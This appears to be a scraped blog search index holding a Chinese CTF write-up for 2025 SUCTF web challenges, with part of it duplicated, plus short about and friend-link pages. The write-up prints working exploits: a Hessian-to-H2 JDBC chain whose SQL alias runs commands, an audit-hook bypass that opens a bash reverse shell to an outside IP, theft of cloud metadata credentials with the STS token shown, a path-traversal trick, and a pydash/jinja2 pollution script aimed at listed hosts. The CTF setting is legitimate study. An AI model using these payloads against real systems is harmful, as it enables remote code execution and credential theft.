\u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - 